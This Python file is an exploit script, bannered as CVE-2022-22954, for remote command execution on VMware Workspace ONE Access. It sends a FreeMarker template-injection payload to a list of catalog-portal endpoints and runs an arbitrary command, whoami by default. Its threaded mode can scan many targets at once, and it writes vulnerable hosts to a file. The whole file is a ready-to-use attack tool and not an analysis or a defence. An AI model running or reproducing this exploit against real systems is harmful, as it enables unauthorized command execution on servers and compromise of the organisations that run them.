from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin
import requests
import re
import argparse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

payloads = {
    "/catalog-portal/ui?code=&deviceType=",
    "/catalog-portal/ui?code=&deviceUdid=",
    "/catalog-portal/hub-ui?deviceType=",
    "/catalog-portal/hub-ui?deviceUdid=",
    "/catalog-portal/hub-ui/byob?deviceType=",
    "/catalog-portal/hub-ui/byob?deviceUdid=",
    "/catalog-portal/ui/oauth/verify?error=&deviceType=",
    "/catalog-portal/ui/oauth/verify?error=&deviceUdid=",
    "/catalog-portal/ui/oauth/verify?code=&deviceType=",
    "/catalog-portal/ui/oauth/verify?code=&deviceUdid=",
}

headers = {
    "Host": "localhost",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                  "Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40",
}

proxies = {
    "http": "127.0.0.1:7890",
    "https": "127.0.0.1:7890"
}


def print_banner():
    banner = '''
   _______    ________    ___   ____ ___  ___       ___  ___  ____  ________ __
  / ____/ |  / / ____/   |__ \ / __ \__ \|__ \     |__ \|__ \/ __ \/ ____/ // /
 / /    | | / / __/________/ // / / /_/ /__/ /_______/ /__/ / /_/ /___ \/ // /_
/ /___  | |/ / /__/_____/ __// /_/ / __// __/_____/ __// __/\__, /___/ /__  __/
\____/  |___/_____/    /____/\____/____/____/    /____/____/____/_____/  /_/   

                                                                   - by bewhale
    '''
    print(banner)


def get_results(text):
    try:
        # print(text)
        # results = re.search("device id: (.*), device type: (.*), auth token", text)
        result = re.search("device id: (.*), device type", text).group(1)
        if "null" == result:
            if "auth token" in text:
                result = re.search("device type: (.*), auth token", text).group(1)
            else:
                result = re.search("device type: (.*)and token revoke status", text).group(1)
        print("\033[33;1m" + result.replace('\\n', '\n').replace('\\t', '\t') + "\033[0m")
    except Exception as e:
        print("\033[33;1m[-] 命令执行结果解析失败，请确认命令是否存在(使用绝对路径)或者手动尝试!\033[0m")


def check_url(url):
    url = url.strip()
    if 'https' not in url:
        url = "https://" + url
    return url


def verify(url, cmd="whoami"):
    exp = '${"freemarker.template.utility.Execute"?new()("' + cmd + '")}'
    for payload in payloads:
        try:
            payload = urljoin(url, payload + exp)
            # output = requests.get(url, headers=headers, verify=False, timeout=15, proxies=proxies)
            output = requests.get(payload, headers=headers, verify=False, timeout=15).text
            if "Authorization context is not valid" in output or "Cannot run program" in output:
                print("\033[31;1m[+] " + url + " is vul!\033[0m")
                get_results(output)
                with open("success.txt", "a+") as f:
                    f.write(url + "\n")
                return None
        except Exception as e:
            print("\033[36;1m[-] " + url + " time out!\033[0m")
            return None
            # print(str(e))
    print("\033[36;1m[-] " + url + " is not vul!\033[0m")
    return None


if __name__ == "__main__":
    print_banner()
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-u', '--url', dest='url', help='target url')
    group.add_argument('-f', '--file', dest='file', help='target file')
    parser.add_argument('-c', '--command', dest='cmd', default='whoami', help='command execute')
    parser.add_argument('-t', '--thread', dest='thread', default=100, type=int, help='thread')

    args = parser.parse_args()

    if args.url:
        verify(check_url(args.url), args.cmd)
    else:
        with ThreadPoolExecutor(args.thread) as executor:
            [executor.submit(verify, check_url(url), args.cmd) for url in open(args.file, "r")]
